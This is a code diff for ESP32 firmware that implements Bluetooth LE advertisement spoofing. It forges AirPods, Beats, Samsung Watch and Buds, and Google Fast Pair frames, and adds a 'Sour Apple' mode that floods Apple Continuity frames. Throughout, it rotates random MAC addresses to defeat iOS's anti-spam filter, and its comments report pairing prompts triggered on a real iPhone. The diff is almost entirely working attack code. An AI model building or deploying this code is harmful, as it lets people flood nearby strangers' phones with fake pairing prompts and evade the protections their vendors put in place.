@@ -7,6 +7,12 @@
 #include "shared.h"
 #include "utils.h"
 
+#if defined(CONFIG_NIMBLE_CPP_IDF)
+#include "host/ble_hs.h"
+#else
+#include "nimble/nimble/host/include/host/ble_hs.h"
+#endif
+
 #ifdef TFT_BLACK
 #undef TFT_BLACK
 #endif
@@ -227,87 +233,321 @@ bool isAdvertising = false;
 int scanTime = 5;
 int deviceType = 1;
 int delaySeconds = 1;
+// Default ADV_IND (connectable undirected). NimBLE only exposes
+ // BLE_GAP_CONN_MODE_{NON,DIR,UND} — map UI labels onto those.
 int advType = 1;
 int attack_state = 1;
 int device_choice = 0;
 int device_index = 0;
 
-// Samsung devices (15 bytes)
+static bool s_spooferAdvConfigured = false;
+static unsigned long s_spooferLastBurstMs = 0;
+
+// Apple Continuity Proximity Pair model IDs (Flipper / AppleJuice).
+static const uint16_t kAppleModels[] = {
+  0x0220, // AirPods
+  0x0E20, // AirPods Pro
+  0x0A20, // AirPods Max
+  0x0F20, // AirPods Gen 2
+  0x1320, // AirPods Gen 3
+  0x1420, // AirPods Pro Gen 2
+  0x0320, // PowerBeats
+  0x0B20, // PowerBeats Pro
+  0x0C20, // Beats Solo Pro
+  0x1120, // Beats Studio Buds
+  0x1020, // Beats Flex
+  0x0520, // Beats X
+  0x0620, // Beats Solo 3
+  0x0920, // Beats Studio 3
+  0x1720, // Beats Studio Pro
+  0x1220, // Beats Fit Pro
+  0x1620, // Beats Studio Buds+
+};
+static constexpr uint8_t kAppleModelCount =
+  sizeof(kAppleModels) / sizeof(kAppleModels[0]);
+
+// Samsung EasySetup Watch models (Flipper Xtreme).
 struct WatchModel {
   uint8_t value;
   const char* name;
 };
-const WatchModel samsungModels[] = {
-  {0x01, "Galaxy Watch 4"},
-  {0x02, "Galaxy Watch 5"},
-  {0x03, "Galaxy Watch 6"}
+static const WatchModel samsungModels[] = {
+  {0x04, "Galaxy Watch 4"},
+  {0x11, "Galaxy Watch 5"},
+  {0x1B, "Galaxy Watch 6"},
 };
-const uint8_t samsungModelCount = 3;
-const uint8_t SAMSUNG_ADV_SIZE = 15;
-const uint16_t SAMSUNG_COMPANY_ID = 0x0075;
-const uint8_t SAMSUNG_ADV_TEMPLATE[SAMSUNG_ADV_SIZE] = {
-  14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00
-};
+static constexpr uint8_t samsungModelCount =
+  sizeof(samsungModels) / sizeof(samsungModels[0]);
 
-// Google device (14 bytes, single model)
-const uint8_t GOOGLE_ADV_SIZE = 14;
-const uint16_t GOOGLE_FAST_PAIR_ID = 0xFE2C;
-const uint8_t GOOGLE_ADV_TEMPLATE[GOOGLE_ADV_SIZE] = {
-  0x03, 0x03, 0x2C, 0xFE, // Complete 16-bit Service UUIDs
-  0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27, // Service Data
-  0x02, 0x0A, 0x00 // TX Power (placeholder, set dynamically)
+// Samsung EasySetup Buds — full 31-byte AD (Flipper).
+struct BudsModel {
+  uint32_t value;
+  const char* name;
 };
-
-const uint8_t DEVICES[][31] = {
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+static const BudsModel samsungBudsModels[] = {
+  {0xEE7A0C, "Galaxy Buds"},
+  {0x9D1700, "Galaxy Buds Dots"},
+  {0xB8B905, "Galaxy Buds White"},
 };
+static constexpr uint8_t samsungBudsModelCount =
+  sizeof(samsungBudsModels) / sizeof(samsungBudsModels[0]);
 
-bool generateSamsungAdvPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
+// Google Fast Pair Service (UUID 0xFE2C) — Flipper model IDs.
+struct FastPairModel {
+  uint32_t value;
+  const char* name;
+};
+static const FastPairModel fastPairModels[] = {
+  {0x00B727, "Google Smart Ctrl"},
+  {0x92BBBD, "Pixel Buds"},
+  {0x000006, "Pixel Buds A-Series"},
+  {0xD446A7, "Sony XM5"},
+  {0x2D7A23, "Sony WF-1000XM4"},
+  {0x0000F0, "Bose QC35 II"},
+  {0xCD8256, "Bose NC 700"},
+  {0x821F66, "JBL Flip 6"},
+  {0xF52494, "JBL Buds Pro"},
+  {0x0582FD, "Pixel Buds Pro"},
+};
+static constexpr uint8_t fastPairModelCount =
+  sizeof(fastPairModels) / sizeof(fastPairModels[0]);
+
+// deviceType: 1..17 Apple, 18..20 Samsung Watch, 21..23 Samsung Buds,
+ // 24..(24+fastPair-1) Google Fast Pair
+static constexpr int kSpooferDeviceMax =
+  17 + (int)samsungModelCount + (int)samsungBudsModelCount + (int)fastPairModelCount;
+
+static void buildAppleProximityPacket(uint8_t* out, uint16_t model) {
+  // Apple Continuity "Proximity Pairing" frame, exactly 31 bytes (BLE max).
+  //
+  // Layout:
+  //   [0..2]   Flags AD: 02 01 1A (LE General Discoverable + BR/EDR not
+  //            supported) — iOS requires a public ADV_IND with flags.
+  //   [3]      Manufacturer AD length = 27 (0x1B)
+  //   [4]      AD type = 0xFF (Manufacturer Specific Data)
+  //   [5..6]   Apple company ID = 4C 00 (little-endian)
+  //   [7]      Continuity sub-type = 0x07 (Proximity Pairing)
+  //   [8]      Continuity payload length = 22 (0x16)
+  //   [9]      status byte = 0x07
+  //   [10..11] product model ID (varies per AirPods/Beats model)
+  //   [12..30] fixed continuity signature + padding
+  //
+  // Only the two-byte model identifier varies between AirPods/Beats products.
+  static const uint8_t kTemplate[31] = {
+    0x02, 0x01, 0x1A,                                 // Flags AD
+    0x1B, 0xFF, 0x4C, 0x00,                           // Manufacturer AD header
+    0x07, 0x16,                                       // sub-type + payload len
+    0x07,                                             // status
+    0x00, 0x00,                                       // model (overwritten below)
+    0x75, 0xAA, 0x30, 0x01, 0x00, 0x00,               // fixed continuity sig
+    0x45, 0x12, 0x12, 0x12,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // padding
+  };
+  memcpy(out, kTemplate, sizeof(kTemplate));
+  out[10] = (uint8_t)((model >> 8) & 0xFF);  // model high byte
+  out[11] = (uint8_t)(model & 0xFF);         // model low byte
+}
+
+static bool generateSamsungWatchPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
   if (modelIndex >= samsungModelCount) return false;
-  uint8_t advDataRaw[SAMSUNG_ADV_SIZE];
-  memcpy(advDataRaw, SAMSUNG_ADV_TEMPLATE, SAMSUNG_ADV_SIZE);
-  advDataRaw[SAMSUNG_ADV_SIZE - 1] = samsungModels[modelIndex].value;
-  advData.addData(std::string((char*)advDataRaw, SAMSUNG_ADV_SIZE));
+  uint8_t raw[15] = {
+    14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00
+  };
+  raw[14] = samsungModels[modelIndex].value;
+  advData.addData(std::string((char*)raw, sizeof(raw)));
   return true;
 }
 
-bool generateGoogleAdvPacket(BLEAdvertisementData& advData) {
-  uint8_t advDataRaw[GOOGLE_ADV_SIZE];
-  memcpy(advDataRaw, GOOGLE_ADV_TEMPLATE, GOOGLE_ADV_SIZE);
-  advDataRaw[GOOGLE_ADV_SIZE - 1] = (uint8_t)(random(121) - 100);
-  advData.addData(std::string((char*)advDataRaw, GOOGLE_ADV_SIZE));
+static bool generateSamsungBudsPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
+  if (modelIndex >= samsungBudsModelCount) return false;
+  const uint32_t model = samsungBudsModels[modelIndex].value;
+  uint8_t raw[31] = {};
+  int i = 0;
+  raw[i++] = 27;
+  raw[i++] = 0xFF;
+  raw[i++] = 0x75;
+  raw[i++] = 0x00;
+  raw[i++] = 0x42;
+  raw[i++] = 0x09;
+  raw[i++] = 0x81;
+  raw[i++] = 0x02;
+  raw[i++] = 0x14;
+  raw[i++] = 0x15;
+  raw[i++] = 0x03;
+  raw[i++] = 0x21;
+  raw[i++] = 0x01;
+  raw[i++] = 0x09;
+  raw[i++] = (uint8_t)((model >> 16) & 0xFF);
+  raw[i++] = (uint8_t)((model >> 8) & 0xFF);
+  raw[i++] = 0x01;
+  raw[i++] = (uint8_t)(model & 0xFF);
+  raw[i++] = 0x06;
+  raw[i++] = 0x3C;
+  raw[i++] = 0x94;
+  raw[i++] = 0x8E;
+  raw[i++] = 0x00;
+  raw[i++] = 0x00;
+  raw[i++] = 0x00;
+  raw[i++] = 0x00;
+  raw[i++] = 0xC7;
+  raw[i++] = 0x00;
+  raw[i++] = 16;
+  raw[i++] = 0xFF;
+  raw[i++] = 0x75;
+  advData.addData(std::string((char*)raw, 31));
   return true;
 }
 
-BLEAdvertisementData getAdvertismentData() {
+static bool generateGoogleAdvPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
+  if (modelIndex >= fastPairModelCount) return false;
+  const uint32_t model = fastPairModels[modelIndex].value;
+  uint8_t raw[14];
+  int i = 0;
+  raw[i++] = 3;
+  raw[i++] = 0x03;  // Complete 16-bit Service UUID list
+  raw[i++] = 0x2C;
+  raw[i++] = 0xFE;  // Fast Pair 0xFE2C
+  raw[i++] = 6;
+  raw[i++] = 0x16;  // Service Data
+  raw[i++] = 0x2C;
+  raw[i++] = 0xFE;
+  raw[i++] = (uint8_t)((model >> 16) & 0xFF);
+  raw[i++] = (uint8_t)((model >> 8) & 0xFF);
+  raw[i++] = (uint8_t)(model & 0xFF);
+  raw[i++] = 2;
+  raw[i++] = 0x0A;  // Tx Power
+  raw[i++] = (uint8_t)(random(121) - 100);
+  advData.addData(std::string((char*)raw, sizeof(raw)));
+  return true;
+}
+
+static BLEAdvertisementData getAdvertismentData() {
   BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
 
-  if (device_choice == 0) { // Apple
-    oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
-  } else if (device_choice == 1) { // Samsung
-    uint8_t samsungIndex = device_index;
-    generateSamsungAdvPacket(samsungIndex, oAdvertisementData);
-  } else if (device_choice == 2) { // Google
-    generateGoogleAdvPacket(oAdvertisementData);
+  if (device_choice == 0) {  // Apple Continuity
+    uint8_t packet[31];
+    const uint16_t model =
+      kAppleModels[device_index % kAppleModelCount];
+    buildAppleProximityPacket(packet, model);
+    oAdvertisementData.addData(std::string((char*)packet, 31));
+  } else if (device_choice == 1) {  // Samsung Watch
+    generateSamsungWatchPacket((uint8_t)device_index, oAdvertisementData);
+  } else if (device_choice == 2) {  // Google Fast Pair
+    generateGoogleAdvPacket((uint8_t)device_index, oAdvertisementData);
+  } else if (device_choice == 3) {  // Samsung Buds
+    generateSamsungBudsPacket((uint8_t)device_index, oAdvertisementData);
   }
 
   return oAdvertisementData;
+}
+
+static uint8_t spooferNimbleAdvMode(int type) {
+  // NimBLE uses connection modes rather than Bluedroid ADV_TYPE_* values.
+  switch (type) {
+    case 2:
+    case 5:
+      return BLE_GAP_CONN_MODE_DIR;
+    case 3:
+    case 4:
+      return BLE_GAP_CONN_MODE_NON;
+    case 1:
+    default:
+      return BLE_GAP_CONN_MODE_UND; // ADV_IND
+  }
+}
+
+// One-time switch from the default public address to a random address type.
+// On ESP32-S3 the NimBLE host has no RPA privacy timer (host-based privacy is
+// compiled out), so nothing will overwrite the static address set below.
+// Done lazily on the first Apple rotation.
+static bool s_spooferMacRandomized = false;
+
+// Generate a fresh random-static BLE address and install it on the NimBLE
+// stack. MUST be called while advertising is stopped (see spooferBurstOnce):
+// the underlying "LE Set Random Address" HCI command is rejected while the
+// radio is actively transmitting, which was the cause of the S3 lockups.
+static void spooferRotateMac() {
+  if (!s_spooferMacRandomized) {
+    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
+    s_spooferMacRandomized = true;
+  }
+
+  // ble_hs_id_set_rnd() takes the address in NimBLE native (little-endian)
+  // order: index 5 is the most-significant byte. A random-static address has
+  // its two most-significant bits set to 11.
+  uint8_t mac[6];
+  int rc;
+  do {
+    esp_fill_random(mac, sizeof(mac));
+    mac[5] |= 0xC0;   // random-static address (bits 7-6 of MSB = 11)
+    mac[0] &= 0xFE;   // unicast (clear multicast bit in the LSB)
+    rc = ble_hs_id_set_rnd(mac);
+  } while (rc != 0);
+}
+
+static void spooferBurstOnce() {
+  if (!pAdvertising) return;
+
+  // Always stop first so the radio is never transmitting while we change
+  // address/data — the safe rotation order that avoids S3 lockups.
+  pAdvertising->stop();
+
+  BLEAdvertisementData oAdvertisementData = getAdvertismentData();
+
+  // NOTE: do NOT use setFlags()/addServiceUUID()/addTxPower() — they prepend
+  // their own AD structures and corrupt the exact 31-byte Apple frame.
+  // getAdvertismentData() injects the raw payload via addData(), which
+  // becomes ble_gap_adv_set_data() byte-for-byte.
+  pAdvertising->setAdvertisementData(oAdvertisementData);
+  pAdvertising->setMinInterval(0x20);
+  pAdvertising->setMaxInterval(0x20);
+  pAdvertising->setMinPreferred(0x20);
+  pAdvertising->setMaxPreferred(0x20);
+
+  // Apple Continuity (AirPods) proximity pairing is only carried by ADV_IND
+  // (connectable undirected). Directed advertising (ADV_DIRECT_IND) carries
+  // NO advertising payload at all, so the Apple packet would never be sent.
+  // Force BLE_GAP_CONN_MODE_UND for Apple regardless of the UI "Type" pick.
+  uint8_t mode;
+  if (device_choice == 0) {
+    mode = BLE_GAP_CONN_MODE_UND; // ADV_IND
+  } else {
+    mode = spooferNimbleAdvMode(advType);
+  }
+  pAdvertising->setAdvertisementType(mode);
+
+  // Apple Continuity: rotate the MAC (stop -> new random-static -> start).
+  // iOS drops repeated advertisements from a static MAC (anti-spam filter).
+  if (device_choice == 0) {
+    spooferRotateMac();
+  }
+
+  // --- Serial diagnostics BEFORE start(): current MAC + exact payload bytes.
+  // Lets us audit that NimBLE preserved the 31-byte packet byte-for-byte.
+  const std::string payload = oAdvertisementData.getPayload();
+  Serial.printf("[spoofer] MAC=%s payload(%u)=",
+                NimBLEDevice::getAddress().toString().c_str(),
+                (unsigned)payload.length());
+  for (size_t i = 0; i < payload.length(); i++) {
+    Serial.printf("%02X", (uint8_t)payload[i]);
+  }
+  Serial.println();
+
+  bool started;
+  if (mode == BLE_GAP_CONN_MODE_DIR) {
+    // Directed advertising needs a target address (random static).
+    uint8_t target[6];
+    esp_fill_random(target, sizeof(target));
+    target[5] |= 0xC0;
+    NimBLEAddress directedTarget(target, BLE_ADDR_RANDOM);
+    started = pAdvertising->start(0, nullptr, &directedTarget);
+  } else {
+    started = pAdvertising->start();
+  }
+  s_spooferLastBurstMs = millis();
+
+  Serial.printf("[spoofer] start()=%d choice=%d index=%d mode=%u\n",
+                (int)started, device_choice, device_index, (unsigned)mode);
 }
 
 static constexpr int SPOOFER_LOG_TOP = 45;
@@ -417,11 +657,19 @@ static const char* spooferDeviceLabel(int type) {
     case 15: return "Beats StudioPro";
     case 16: return "Beats FitPro";
     case 17: return "Beats BudsPlus";
-    case 18: return "Galaxy Watch 4";
-    case 19: return "Galaxy Watch 5";
-    case 20: return "Galaxy Watch 6";
-    case 21: return "Google Smart Ctrl";
-    default: return "Airpods";
+    case 18: return samsungModels[0].name;
+    case 19: return samsungModels[1].name;
+    case 20: return samsungModels[2].name;
+    case 21: return samsungBudsModels[0].name;
+    case 22: return samsungBudsModels[1].name;
+    case 23: return samsungBudsModels[2].name;
+    default: {
+      const int fp = type - 24;
+      if (fp >= 0 && fp < (int)fastPairModelCount) {
+        return fastPairModels[fp].name;
+      }
+      return "Airpods";
+    }
   }
 }
 
@@ -622,6 +870,7 @@ void Beats_Studio_Pro() {
 void Betas_Fit_Pro() {
   device_choice = 0;
   device_index = 15;
+  attack_state = 1;
 }
 
 void Beats_Studio_Buds_Plus() {
@@ -632,114 +881,72 @@ void Beats_Studio_Buds_Plus() {
 
 // Android devices
 void Galaxy_Watch_4() {
-  device_choice = 1; // Samsung
+  device_choice = 1; // Samsung Watch
   device_index = 0;
   attack_state = 1;
 }
 
 void Galaxy_Watch_5() {
-  device_choice = 1; // Samsung
+  device_choice = 1;
   device_index = 1;
   attack_state = 1;
 }
 
 void Galaxy_Watch_6() {
-  device_choice = 1; // Samsung
+  device_choice = 1;
   device_index = 2;
   attack_state = 1;
 }
 
-void Google_Smart_Ctrl() {
-  device_choice = 2; // Google
-  device_index = 0;
+void Galaxy_Buds(uint8_t idx) {
+  device_choice = 3; // Samsung Buds EasySetup
+  device_index = idx % samsungBudsModelCount;
+  attack_state = 1;
+}
+
+void Google_Fast_Pair(uint8_t idx) {
+  device_choice = 2; // Google Fast Pair
+  device_index = idx % fastPairModelCount;
   attack_state = 1;
 }
 
 void setAdvertisingData() {
-
-  switch (deviceType) {
-    case 1:
-      Airpods();
-      break;
-    case 2:
-      Airpods_pro();
-      break;
-    case 3:
-      Airpods_Max();
-      break;
-    case 4:
-      Airpods_Gen_2();
-      break;
-    case 5:
-      Airpods_Gen_3();
-      break;
-    case 6:
-      Airpods_Pro_Gen_2();
-      break;
-    case 7:
-      Power_Beats();
-      break;
-    case 8:
-      Power_Beats_Pro();
-      break;
-    case 9:
-      Beats_Solo_Pro();
-      break;
-    case 10:
-      Beats_Studio_Buds();
-      break;
-    case 11:
-      Beats_Flex();
-      break;
-    case 12:
-      Beats_X();
-      break;
-    case 13:
-      Beats_Solo_3();
-      break;
-    case 14:
-      Beats_Studio_3();
-      break;
-    case 15:
-      Beats_Studio_Pro();
-      break;
-    case 16:
-      Betas_Fit_Pro();
-      break;
-    case 17:
-      Beats_Studio_Buds_Plus();
-      break;
-    case 18:
-      Galaxy_Watch_4();
-      break;
-    case 19:
-      Galaxy_Watch_5();
-      break;
-    case 20:
-      Galaxy_Watch_6();
-      break;
-    case 21:
-      Google_Smart_Ctrl();
-      break;
-    default:
-      Airpods();
-      break;
+  if (deviceType >= 1 && deviceType <= 17) {
+    device_choice = 0;
+    device_index = deviceType - 1;
+    attack_state = 1;
+  } else if (deviceType >= 18 && deviceType <= 20) {
+    device_choice = 1;
+    device_index = deviceType - 18;
+    attack_state = 1;
+  } else if (deviceType >= 21 && deviceType <= 23) {
+    Galaxy_Buds((uint8_t)(deviceType - 21));
+  } else if (deviceType >= 24 && deviceType <= kSpooferDeviceMax) {
+    Google_Fast_Pair((uint8_t)(deviceType - 24));
+  } else {
+    Airpods();
   }
 }
 
 void changeDeviceTypeNext() {
   deviceType++;
-  if (deviceType > 21) deviceType = 1;
+  if (deviceType > kSpooferDeviceMax) deviceType = 1;
   Serial.println("Device Type Next: " + String(deviceType));
   setAdvertisingData();
+  if (isAdvertising && pAdvertising) {
+    spooferBurstOnce();
+  }
   updateSpoofer();
 }
 
 void changeDeviceTypePrev() {
   deviceType--;
-  if (deviceType < 1) deviceType = 21;
+  if (deviceType < 1) deviceType = kSpooferDeviceMax;
   Serial.println("Device Type Prev: " + String(deviceType));
   setAdvertisingData();
+  if (isAdvertising && pAdvertising) {
+    spooferBurstOnce();
+  }
   updateSpoofer();
 }
 
@@ -748,6 +955,9 @@ void changeAdvTypeNext() {
   if (advType > 5) advType = 1;
   Serial.println("Advertising Type Next: " + String(advType));
   setAdvertisingData();
+  if (isAdvertising && pAdvertising) {
+    spooferBurstOnce();
+  }
   updateSpoofer();
 }
 
@@ -756,6 +966,9 @@ void changeAdvTypePrev() {
   if (advType < 1) advType = 5;
   Serial.println("Advertising Type Prev: " + String(advType));
   setAdvertisingData();
+  if (isAdvertising && pAdvertising) {
+    spooferBurstOnce();
+  }
   updateSpoofer();
 }
 
@@ -763,31 +976,20 @@ void toggleAdvertising() {
   isAdvertising = !isAdvertising;
 
   if (!isAdvertising) {
-    pAdvertising->stop();
+    if (pAdvertising) {
+      pAdvertising->stop();
+    }
+    s_spooferAdvConfigured = false;
     Serial.println("Advertising stopped.");
     Printspoofer("[!] Advertising stopped", TFT_YELLOW, true);
     updateSpoofer();
   } else {
-    if (attack_state == 1) {
-      esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-      for (int i = 0; i < 6; i++) {
-        dummy_addr[i] = random(256);
-        if (i == 0) {
-          dummy_addr[i] |= 0xF0;
-        }
-      }
+    setAdvertisingData();
+    if (attack_state == 1 && pAdvertising) {
+      spooferBurstOnce();
 
-      BLEAdvertisementData oAdvertisementData = getAdvertismentData();
-      pAdvertising->addServiceUUID(devices_uuid);
-      pAdvertising->setAdvertisementData(oAdvertisementData);
-      pAdvertising->setMinInterval(0x20);
-      pAdvertising->setMaxInterval(0x20);
-      pAdvertising->setMinPreferred(0x20);
-      pAdvertising->setMaxPreferred(0x20);
-      pAdvertising->start();
-
-      Printspoofer("[+] Device Type: " + String(deviceType), TFT_WHITE, false);
-      Printspoofer("[+] Advertising Type: " + String(advType), TFT_WHITE, false);
+      Printspoofer("[+] " + String(spooferDeviceLabel(deviceType)), TFT_WHITE, false);
+      Printspoofer("[+] Adv: " + String(spooferAdvLabel(advType)), TFT_WHITE, false);
       Printspoofer("[!] Advertising started", TFT_YELLOW, false);
     }
 
@@ -960,6 +1162,18 @@ void spooferLoop() {
 
     if (isButtonPressedEdge(BTN_RIGHT))  changeAdvTypeNext();
     if (isButtonPressedEdge(BTN_SELECT)) toggleAdvertising();
+
+    // Periodic safe MAC rotation for Apple Continuity. iOS drops repeated
+    // advertisements from a static MAC (anti-spam filter), so the address
+    // must keep changing. spooferBurstOnce() rotates safely (stop -> new
+    // random-static MAC -> start), never while the radio is transmitting.
+    if (isAdvertising && device_choice == 0 && attack_state == 1 && pAdvertising) {
+      const uint32_t intervalMs =
+          (uint32_t)(delaySeconds > 0 ? delaySeconds : 1) * 1000UL;
+      if ((uint32_t)(now - s_spooferLastBurstMs) >= intervalMs) {
+        spooferBurstOnce();
+      }
+    }
   }
 }
 
@@ -970,248 +1184,1029 @@ void exit() {
     pAdvertising->stop();
     isAdvertising = false;
   }
+  s_spooferAdvConfigured = false;
 }
 }
 
 namespace SourApple {
-static bool uiDrawn = false;
 
-#define SCREEN_WIDTH  240
-#define SCREENHEIGHT 320
-#define STATUS_BAR_Y_OFFSET 20
-#define STATUS_BAR_HEIGHT 16
-#define ICON_SIZE 16
-#define ICON_NUM 1
+// ---------------------------------------------------------------------------
+// Sour Apple - Apple Continuity prompt flooding.
+//
+// The feature floods Apple Continuity frames, each from a fresh random-static
+// address, so the phone keeps offering pairing/setup prompts instead of
+// filtering the repeats. What made it dead on the air (and its Exit button
+// unresponsive) was everything around the frame:
+//
+//   * the radio was started as soon as the screen opened, with no way to
+//     stop it and no Start/Stop control;
+//   * updatedisplay() called Advertising->stop() on every repaint, so the
+//     radio was live only for the ~40ms before each blocking full-screen
+//     redraw -- and LEFT was sampled only between two of those redraws;
+//   * the random address generated on every pass was discarded, so every
+//     advertisement came from the same address: exactly the repetition that
+//     iOS' anti-spam filter drops;
+//   * addServiceUUID() was queued again on every pass. NimBLE ignores that
+//     list once custom advertising data is set, so it only grew forever.
+//
+// This now follows the Apple path proven in BleSpoofer: stop -> new
+// random-static address -> set the exact frame -> start, with no radio work
+// anywhere in the draw path and a loop that never blocks.
+//
+// Measured on one iPhone (iOS 26.6.2), radio side confirmed over serial.
+// Prompts only flow while the pending one is dismissed: an open prompt blocks
+// the next, and dismissing it released the following one 2-6s later. Counting
+// that way, in one session: AirTag frame 7 prompts, AirPods frame 4 (all
+// different accessories), the original 17-byte 0x0F frame 1, the
+// EvilAppleJuice audio frame 0. The default variant therefore sweeps every
+// model of every family in turn, AirTag first, and holds each frame for 2s.
+// ---------------------------------------------------------------------------
 
-static int iconX[ICON_NUM] = {10};
-static int iconY = STATUS_BAR_Y_OFFSET;
+static constexpr int kStatusBarY = 20;
+static constexpr int kStatusBarH = 16;
+static constexpr int kIconSize = 16;
+static constexpr int kIconCount = 1;
 
-std::string device_uuid = "00003082-0000-1000-9000-00805f9b34fb";
+static constexpr int kInfoY = 42;
+static constexpr int kRowH = 16;
+static constexpr int kLabelX = 10;
+static constexpr int kValueX = 70;
+static constexpr int kValueW = 100;
+static constexpr int kRightMargin = 10;
+static constexpr int kFieldH = 10;
+static constexpr int kLogHdrY = 130;
+static constexpr int kLogY = 146;
+static constexpr int kLogLineH = 12;
+static constexpr int kMaxLog = 16;
+static constexpr int kLogLineLen = 40;
 
-BLEAdvertising *Advertising;
+static constexpr unsigned long kBtnDebounceMs = 220;
+// How long each frame (and its address) is held before the next rotation. This
+// is also the only moment the radio is off: the controller rejects an address
+// change while advertising. RIGHT cycles these; see kDefaultRateIndex.
